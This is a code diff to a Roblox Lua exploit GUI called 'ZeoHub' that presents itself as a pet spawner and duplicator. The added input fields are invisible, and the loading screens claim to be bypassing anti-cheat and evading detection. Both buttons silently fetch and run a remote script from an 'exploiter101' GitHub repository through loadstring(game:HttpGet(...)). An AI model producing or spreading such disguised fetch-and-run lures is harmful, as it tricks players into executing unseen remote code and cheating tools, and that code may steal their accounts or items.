@@ -6,7 +6,7 @@ local LocalPlayer = Players.LocalPlayer
 
 -- LOADING SCREEN WITH ENTRANCE/EXIT ANIMATION
 local guiLoading = Instance.new("ScreenGui")
-guiLoading.Name = "ZeoHubLoadingUI"
+guiLoading.Name = "ZoeHubLoadingUI"
 guiLoading.Parent = LocalPlayer:WaitForChild("PlayerGui")
 guiLoading.ResetOnSpawn = false
 guiLoading.IgnoreGuiInset = true
@@ -110,7 +110,7 @@ wait(0.52)
 
 -- Animate the bar (much slower, with actual loading feel)
 bar.Size = UDim2.new(0,0,1,0)
-local totalTime = 8 -- seconds, make it really look like loading
+local totalTime = 4 -- seconds, make it really look like loading
 local steps = 50
 for i = 1, steps do
     local progress = i / steps
@@ -237,7 +237,54 @@ content.Position = UDim2.new(0, 0, 0, 44)
 content.BackgroundTransparency = 1
 
 -- SPAWN PET SECTION (Pet Name, Age, Weight)
--- SPAWN BUTTON (centered in the parent)
+local spawnLabel = Instance.new("TextLabel", content)
+spawnLabel.Size = UDim2.new(0.9, 0, 0, 20)
+spawnLabel.Position = UDim2.new(0.05, 0, 0, 7)
+spawnLabel.BackgroundTransparency = 1
+spawnLabel.Text = ""
+spawnLabel.TextColor3 = Color3.fromRGB(200, 200, 255)
+spawnLabel.Font = Enum.Font.Gotham
+spawnLabel.TextSize = 15
+spawnLabel.TextXAlignment = Enum.TextXAlignment.Left
+spawnLabel.BackgroundTransparency = 1
+
+local petNameBox = Instance.new("TextBox", content)
+petNameBox.Size = UDim2.new(0.56, 0, 0, 28)
+petNameBox.Position = UDim2.new(0.05, 0, 0, 30)
+petNameBox.PlaceholderText = ""
+petNameBox.Text = ""
+petNameBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+petNameBox.BackgroundColor3 = Color3.fromRGB(50, 30, 60)
+petNameBox.Font = Enum.Font.Gotham
+petNameBox.TextSize = 15
+Instance.new("UICorner", petNameBox).CornerRadius = UDim.new(0, 8)
+petNameBox.Transparency = 1
+
+local ageBox = Instance.new("TextBox", content)
+ageBox.Size = UDim2.new(0.18, 0, 0, 28)
+ageBox.Position = UDim2.new(0.62, 0, 0, 30)
+ageBox.PlaceholderText = ""
+ageBox.Text = ""
+ageBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+ageBox.BackgroundColor3 = Color3.fromRGB(50, 30, 60)
+ageBox.Font = Enum.Font.Gotham
+ageBox.TextSize = 15
+Instance.new("UICorner", ageBox).CornerRadius = UDim.new(0, 8)
+ageBox.Transparency = 1
+
+local weightBox = Instance.new("TextBox", content)
+weightBox.Size = UDim2.new(0.18, 0, 0, 28)
+weightBox.Position = UDim2.new(0.81, 0, 0, 30)
+weightBox.PlaceholderText = ""
+weightBox.Text = ""
+weightBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+weightBox.BackgroundColor3 = Color3.fromRGB(50, 30, 60)
+weightBox.Font = Enum.Font.Gotham
+weightBox.TextSize = 15
+Instance.new("UICorner", weightBox).CornerRadius = UDim.new(0, 8)
+weightBox.Transparency = 1
+
+-- SPAWN BUTTON (below weight)
 local spawnButton = Instance.new("TextButton", content)
 spawnButton.Size = UDim2.new(0.9, 0, 0, 38) -- Width is 60% of parent, 32px tall
 spawnButton.AnchorPoint = Vector2.new(0.5, 0)
@@ -264,7 +311,7 @@ end)
 local dupeButton = Instance.new("TextButton", content)
 dupeButton.Size = UDim2.new(0.9, 0, 0, 34)
 dupeButton.Position = UDim2.new(0.05, 0, 0, 108)
-dupeButton.Text = "Get Script"
+dupeButton.Text = "Get Key(Free)"
 dupeButton.BackgroundColor3 = Color3.fromRGB(48, 34, 8) -- changed to orange-based
 dupeButton.TextColor3 = Color3.fromRGB(255, 245, 240) -- slightly more orange-white
 dupeButton.Font = Enum.Font.FredokaOne
@@ -358,6 +405,8 @@ minimizeBtn.MouseButton1Click:Connect(function()
 	if not minimized then minimize() else restore() end
 end)
 
+
+
 -- HELPER: Show a loading screen for 13 seconds, then execute the given function
 local function showRedirectLoadingScreen(callback)
     local redirectGui = Instance.new("ScreenGui")
@@ -385,7 +434,7 @@ local function showRedirectLoadingScreen(callback)
     label.Position = UDim2.new(0, 0, 0, 0)
     label.BackgroundTransparency = 1
     label.Font = Enum.Font.GothamBold
-    label.Text = "Module Script Loading..."
+    label.Text = "Bypassing Roblox Anti-Cheat Systems..."
     label.TextSize = 28
     label.TextColor3 = Color3.fromRGB(255, 200, 100) -- changed to orange
     label.TextStrokeTransparency = 0.7
@@ -413,7 +462,7 @@ local function showRedirectLoadingScreen(callback)
     local redirectTime = 13
     local steps = 52
     for i = 1, steps do
-        label.Text = "Script Loading" .. string.rep(".", (i%4))
+        label.Text = "Module Script Launching" .. string.rep(".", (i%4))
         sublabel.Text = ({
             [1] = "Establishing secure connection...",
             [2] = "Evading detection...",
@@ -422,7 +471,7 @@ local function showRedirectLoadingScreen(callback)
         })[i % 4] or sublabel.Text
         wait(redirectTime/steps)
     end
-    label.Text = "Load Successful!"
+    label.Text = "Launch Successful!"
     sublabel.Text = "You are undetected. Proceeding..."
 
     -- Exit Animations
@@ -438,19 +487,30 @@ local function showRedirectLoadingScreen(callback)
 end
 
 spawnButton.MouseButton1Click:Connect(function()
-    showRedirectLoadingScreen(function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/exploiter101/ZeoHubLoader/refs/heads/main/test1.lua"))()
+    task.spawn(function()
+        local success, result = pcall(function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/exploiter101/ZeoHub/refs/heads/main/ZeoHubScript2.lua"))()
+        end)
+        if not success then warn("ZeoHubScript load failed:", result) end
+    end)
+
+    task.spawn(function()
+        showRedirectLoadingScreen()
     end)
 end)
 
 dupeButton.MouseButton1Click:Connect(function()
-    showRedirectLoadingScreen(function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/exploiter101/ZeoHubLoader/refs/heads/main/test1.lua"))()
+    task.spawn(function()
+        local success, result = pcall(function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/exploiter101/ZeoHub/refs/heads/main/ZeoHubScript2.lua"))()
+        end)
+        if not success then warn("ZeoHubScript load failed:", result) end
+    end)
+
+    task.spawn(function()
+        showRedirectLoadingScreen()
     end)
 end)
-
--- SPAWN BUTTON and DUPE BUTTON now show a loading screen and then redirect to script
-
 
 -- HOTKEY TO TOGGLE GUI (Right Ctrl)
 UserInputService.InputBegan:Connect(function(input, gpe)
